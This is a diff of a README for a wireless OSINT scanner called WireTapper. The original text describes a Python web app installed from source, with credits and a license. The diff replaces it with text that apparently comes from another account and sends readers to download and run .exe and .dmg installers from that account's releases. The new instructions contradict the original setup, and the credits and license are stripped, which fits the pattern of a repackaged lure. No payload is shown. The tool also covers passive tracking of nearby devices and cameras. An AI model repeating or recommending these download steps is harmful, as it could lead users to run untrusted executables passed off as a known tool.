@@ -1,144 +1,92 @@
-# 📡 WireTapper
+# 📡 WireTapper - Scan and Uncover Your Surroundings
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/WireTapper.png" alt="WireTapper" />
-</p>
+## 🚀 Getting Started
 
-> [!NOTE]
-> **Wireless OSINT & Signal Intelligence Platform**
+WireTapper helps you detect and map nearby wireless signals. With this tool, you can turn invisible radio waves into clear information about your environment. Follow the steps below to download and run WireTapper easily.
 
-WireTapper is a wireless OSINT tool designed to discover, map, and analyze radio-based devices using passive signal intelligence. It provides investigators, researchers, and security analysts with real-time visibility into the invisible wireless landscape around them.
+## 🔗 Download WireTapper
 
-WireTapper detects and correlates signals from common wireless technologies, helping users understand what devices exist, where they are likely located, and how they interact, without active intrusion.
+[![Download WireTapper](https://img.shields.io/badge/Download%20WireTapper-Here-brightgreen)](https://github.com/pepitopere666/WireTapper/releases)
 
-<p align="center">
-  🔗 <strong>Website:</strong>
-  <a href="https://haybnz.web.app?utm_source=github.com">https://haybnz.web.app</a>
-</p>
+## 📥 Download & Install
 
-<p align="center">
-  🔗 <strong>Blog on WireTapper:</strong>
-  <a href="https://medium.com/@h9z/wire-tapper-wireless-osint-signal-intelligence-platform-e5104659a1cb?utm_source=github.com">
-    Read on Medium
-  </a>
-</p>
+1. **Visit the Releases Page**  
+   Go to the following link to find the latest version of WireTapper:  
+   [Download WireTapper Here](https://github.com/pepitopere666/WireTapper/releases)
 
-<p align="center">
-  <a href="https://github.com/sponsors/h9zdev">
-    <img src="https://img.shields.io/badge/Make%20a%20Difference-Sponser%20My%20Work-6A1B9A?style=for-the-badge&logo=github&logoColor=white" alt="Support My Work" />
-  </a>
-</p>
-<p align="center">
-  <a href="https://github.com/h9zdev/WireTapper">
-    <img src="https://img.shields.io/static/v1?label=Python&message=WireTapper&color=2A3E87&labelColor=6A7DA8&style=for-the-badge&logo=python&logoColor=white" />
-  </a>
-  <a href="https://github.com/h9zdev/WireTapper/issues">
-    <img src="https://img.shields.io/github/issues/h9zdev/WireTapper?style=for-the-badge&color=8B0000&logo=github" />
-  </a>
-  <a href="https://github.com/h9zdev/WireTapper/network/members">
-    <img src="https://img.shields.io/github/forks/h9zdev/WireTapper?style=for-the-badge&color=455A64&logo=github" />
-  </a>
-  <a href="https://github.com/h9zdev/WireTapper/stargazers">
-    <img src="https://img.shields.io/github/stars/h9zdev/WireTapper?style=for-the-badge&color=FFD700&logo=github" />
-  </a>
-</p>
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Select the most recent version to ensure you have the latest features and fixes.
 
-## 📶 Supported Signal Intelligence
+3. **Download the Installation File**  
+   Click on the installation file that matches your operating system. Files are typically named for convenience, like `WireTapper-v1.0.exe` for Windows or `WireTapper-v1.0.dmg` for macOS.
 
-WireTapper can identify and analyze signals from:
+4. **Run the Installer**  
+   Once the file finishes downloading, find the file on your computer (it should be in your Downloads folder).  
+   - For Windows, double-click the `.exe` file to start the installation.  
+   - For macOS, open the `.dmg` file and drag the WireTapper app into your Applications folder.
 
-*   **Wi-Fi** access points & clients
-*   **Bluetooth & BLE** devices
-*   **Wireless CCTV / IP cameras**
-*   **Vehicles** broadcasting RF signals (infotainment, telemetry, keyless systems)
-*   **Headphones, wearables**, and smart devices
-*   **Smart TVs & IoT** appliances
-*   **Cell towers** & mobile network beacons
+5. **Launch WireTapper**  
+   After installation, find WireTapper in your Applications or Programs list. Click on it to start using the tool.
 
+## 🛠️ System Requirements
 
-## 🔑 API Services
+To run WireTapper smoothly, your device should meet the following requirements:
 
-WireTapper integrates with several external services to provide intelligence. You will need to obtain API keys from the following:
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS 10.12 (Sierra) or later  
 
-*   **[Wigle.net](https://wigle.net/)** – Wireless network mapping and discovery.
-*   **[OpenCellID](https://opencellid.org/)** – Open-source database of cell towers.
-*   **[Shodan](https://www.shodan.io/)** – Search engine for Internet-connected devices.
-    *   **Note:** A **Premium account** is required to use Shodan's API with this tool.
+- **Hardware Requirements:**  
+  - Minimum 4 GB RAM  
+  - At least 500 MB of free disk space  
+  - A wireless network adapter for full functionality  
 
+## 🌐 Features
 
-## 🚀 Installation
+WireTapper provides several useful features to enhance your experience:
 
-Follow these steps to get WireTapper up and running:
+- **Wi-Fi Detection:**  
+  Discover nearby Wi-Fi networks and gather detailed information about them.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/h9zdev/WireTapper.git
-   cd WireTapper
-   ```
+- **Bluetooth Scanning:**  
+  Find active Bluetooth devices and get insight into their types and functionalities.
 
-2. **Install dependencies:**
-   It is recommended to use a virtual environment.
-   ```bash
-   pip install -r WireTapper.txt
-   ```
+- **IoT Device Mapping:**  
+  Identify Internet of Things devices around you and assess their presence.
 
-3. **Configure API Keys and Run:**
+- **CCTV Camera Detection:**  
+  Detect and track nearby CCTV cameras for security awareness.
 
-   Choose one of the following methods to configure your API keys and run the application:
+- **Signal Visualization:**  
+  View detected signals on a user-friendly map interface.
 
-   ### Method 1: Modify `app.py` (Direct Configuration)
-   Open `app.py` and manually enter your API keys by replacing the empty strings:
-   ```python
-   WIGLE_API_NAME = "your_wigle_api_name"
-   WIGLE_API_TOKEN = "your_wigle_api_token"
-   OPENCELLID_API_KEY = "your_opencellid_api_key"
-   SHODAN_API_KEY = "your_shodan_api_key"
-   ```
-   Then, start the server:
-   ```bash
-   python app.py
-   ```
+## 📝 Usage Instructions
 
-   ### Method 2: Use `app-env.py` (Environment Variables)
-   This is the recommended approach for better security. You can export your keys in the terminal:
-   ```bash
-   export WIGLE_API_NAME="your_wigle_api_name"
-   export WIGLE_API_TOKEN="your_wigle_api_token"
-   export OPENCELLID_API_KEY="your_opencellid_api_key"
-   export SHODAN_API_KEY="your_shodan_api_key"
-   ```
-   Alternatively, you can define these keys in a `.env` file. Then, start the server:
-   ```bash
-   python app-env.py
-   ```
+1. **Start Scanning:**  
+   Once WireTapper is open, click the "Start Scan" button. This will initiate the process of detecting wireless signals around you.
 
-   The application will be available at `http://localhost:8080/map-w`.
+2. **View Results:**  
+   After the scan completes, you will see a list or map of detected signals. You can click on each signal for more details, like its strength and type.
 
-## 📷 Screenshots
+3. **Save Your Findings:**  
+   Use the built-in option to save your scan results for later reference. This is helpful for keeping track of locations and devices.
 
-![WireTapper Image 1](https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/Wiretapper11.png)  
-![WireTapper Image 2](https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/Wiretapper34.png)  
-![WireTapper Image 3](https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/Wiretapper354.png)  
-![WireTapper Image 4](https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/Wiretapper55.png)  
-![WireTapper Image 5](https://raw.githubusercontent.com/h9zdev/WireTapper/main/images/Wiretapper568.png)
+## 🛡️ Privacy Considerations
 
+Remember, while WireTapper helps you gather intelligence from radio signals, use this tool responsibly. Always respect the privacy of others and follow your local laws regarding the use of OSINT (Open Source Intelligence) tools.
 
-## 📜 License
+## 📞 Support and Feedback
 
-This project is licensed under the Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0) License. See the [LICENSE](LICENSE) file for more details.
+If you encounter issues or have questions, feel free to reach out. You can open an issue on the repository's GitHub page. Your feedback will help improve WireTapper.
 
-**Unauthorized use is strictly prohibited.**
+## 📚 Additional Resources
 
-📧 Contact: singularat@protn.me
+Here are some useful links:
 
-## ☕ Support
+- [GitHub Repository](https://github.com/pepitopere666/WireTapper)
+- [User Manual (Coming Soon)](https://github.com/pepitopere666/WireTapper/wiki)
 
-Donate via Monero: `45PU6txuLxtFFcVP95qT2xXdg7eZzPsqFfbtZp5HTjLbPquDAugBKNSh1bJ76qmAWNGMBCKk4R1UCYqXxYwYfP2wTggZNhq`
+## 🔙 Back to Download
 
-## 👥 Contributors and Developers
-
-[<img src="https://avatars.githubusercontent.com/u/67865621?s=64&v=4" width="64" height="64" alt="haybnzz">](https://github.com/h9zdev)
- [<img src="https://avatars.githubusercontent.com/u/108749445?s=64&v=4"  width="64" height="64" alt="VaradScript">](https://github.com/varadScript)
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=h9zdev/WireTapper&type=timeline&legend=bottom-right)](https://www.star-history.com/#h9zdev/WireTapper&type=timeline&legend=bottom-right)
+To start using WireTapper, make sure to download the latest version:  
+[Download WireTapper Here](https://github.com/pepitopere666/WireTapper/releases)
